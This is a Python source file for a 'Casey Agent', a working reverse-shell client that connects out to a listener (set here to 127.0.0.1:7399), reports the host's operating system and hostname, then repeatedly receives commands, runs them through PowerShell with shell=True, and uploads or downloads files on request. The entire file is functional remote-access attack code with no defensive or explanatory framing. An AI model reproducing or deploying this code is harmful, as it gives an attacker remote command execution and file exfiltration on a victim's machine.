# Casey Agent

import socket, subprocess, os, platform
import re
import json


class Agent:
    # CONSTRUCTOR METHOD =====
    def __init__(self, listener_ip, listener_port):
        self.localSocket = socket.socket()
        self.bufferSize  = 1024

        platformInfo      = platform.uname()
        self.operatingSys = platformInfo[0]
        self.hostname     = platformInfo[1]
        self.banner = f"[=] Operating System: {self.operatingSys}\n[=] Hostname: {self.hostname}\n"

        self.localSocket.connect((listener_ip, listener_port))
    # END OF CONSTRUCTOR METHOD

    # GENERATE PROMPT =====
    def generatePrompt(self):
        username      = subprocess.check_output(["whoami"]).decode()
        curWorkingDir = os.getcwd()
        prompt        = ""

        if (self.operatingSys == "Windows"):
            username = username.split("\\")[1].rstrip()
            prompt   = "PS " + username + "@" + self.hostname + " " + curWorkingDir + "\n>>> "

        return prompt
    # END OF generatePrompt METHOD

    # SEND DATA =====
    def sendData(self, data):
        jsonData = json.dumps(data)

        self.localSocket.send(jsonData.encode())
    # END OF sendData METHOD

    # RECEIVE DATA =====
    def recvData(self):
        jsonData = ""

        while (True):
            try:
                jsonData += self.localSocket.recv(self.bufferSize).decode()

                return json.loads(jsonData)

            except ValueError:
                continue
    # END OF recvData METHOD

    # SEND FILE =====
    def sendFile(self, file_path):
        file     = open(file_path, "rb")
        fileSize = os.path.getsize(file_path)

        self.localSocket.send(str(fileSize).encode())

        data = file.read()
        self.localSocket.sendall(data)

        file.close()
    # END OF sendFile METHOD

    # RECEIVE FILE =====
    def recvFile(self, cmd_list): 
        destination = ""

        if (len(cmd_list) == 2):
            filePath = cmd_list[-1]
            if   (self.operatingSys == "Windows"): destination = filePath.split("\\")[-1]
            elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
        elif (len(cmd_list) == 3): destination = cmd_list[-1]

        fileSize   = self.localSocket.recv(self.bufferSize).decode()
        file       = open(destination, "wb")
        fileBytes  = b""
        remainSize = int(fileSize)
        
        while (0 < remainSize):
            if (self.bufferSize <= remainSize):
                fileBytes += self.localSocket.recv(self.bufferSize)
                remainSize -= self.bufferSize
            elif (remainSize < self.bufferSize):
                fileBytes  += self.localSocket.recv(remainSize)
                remainSize -= remainSize
        
        file.write(fileBytes)
        file.close()
        return f"[+] Agent: File successfully saved to {destination}\n"
    # END OF recvFile METHOD

    # PROCESS COMMAND =====
    def processCommand(self, cmd):
        try:
            cmdBlacklist = ["powershell", "cmd"]

            cmdList = cmd.split()
            result = ""

            # Change directory
            if (cmdList[0] == "cd") and (1 < len(cmdList)):
                destination = cmd[3:].replace("\"", "")
                os.chdir(destination)
                result = f"[+] Directory changed to {os.getcwd()}\n"

            # Change drive
            elif (len(cmdList) == 1) and (re.search(r"[A-Z]:", cmdList[0]) != None):
                os.chdir(cmdList[0])
                result = f"[+] Directory changed to {os.getcwd()}\n"
            
            # Send file to the listener
            elif (cmdList[0].lower() == "download") and (1 < len(cmdList)):
                filePath = cmdList[1]
                self.sendFile(filePath)
                result = "[+] Server: File transfer complete\n"

            # Receive file and save
            elif (cmdList[0].lower() == "upload") and (1 < len(cmdList)):
                result = self.recvFile(cmdList)
            
            # Handle blacklist command
            elif (cmd in cmdBlacklist): 
                result = "[!] Command not allowed. If you want to start another process, start it with 'Start-Process' to make it run as a separate process\n"

            # Other commands
            else:
                if (self.operatingSys == "Windows"):
                    cmdList = ["powershell"] + cmdList

                    # Add 'Start-Process' to the beginning of the command when an executable is called to prevent the shell from hanging
                    if (".exe" in cmd.lower()): cmdList.insert(1, "Start-Process")

                cmdProcess = subprocess.run(cmdList, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)

                returnCode = cmdProcess.returncode
                output     = cmdProcess.stdout
                error      = cmdProcess.stderr

                if (returnCode == 0):
                    if (output == b""): result = "[+] Command executed successfully\n"
                    else:               result = output.decode()
                elif (returnCode == 1): result = error.decode()

        except subprocess.TimeoutExpired:
            result = "[!] Command timed out\n"
        except subprocess.CalledProcessError:
            result = f"[!] {cmd}: Invalid command\n"
        except FileNotFoundError:
            result = "[!] Invalid directory, file name, or volume lable\n"
        except OSError:
            result = "[!] Invalid directory, file name, or volume lable\n"
        except PermissionError:
            result = "[!] Permission denied\n"

        return result
    # END OF processCommand METHOD

    # EXECUTE =====
    def execute(self):
        try:
            self.sendData(self.banner)

            while (True):
                prompt = self.generatePrompt()
                self.sendData(prompt)

                command       = self.recvData()
                commandResult = self.processCommand(command)

                self.sendData(commandResult)

        except ValueError:
            print("[!] Data transfer aborted\n")
        except KeyboardInterrupt:
            print("[!] Exiting the program\n")
            self.localSocket.close()
        except ConnectionAbortedError:
            print("[!] Listener closed the session\n")
            self.localSocket.close()
        except ConnectionResetError:
            print("[!] Listener closed the session\n")
            self.localSocket.close()
    # END OF execute METHOD


# BEGINNING OF MAIN =====

agent = Agent("127.0.0.1", 7399)
agent.execute()

# END OF MAIN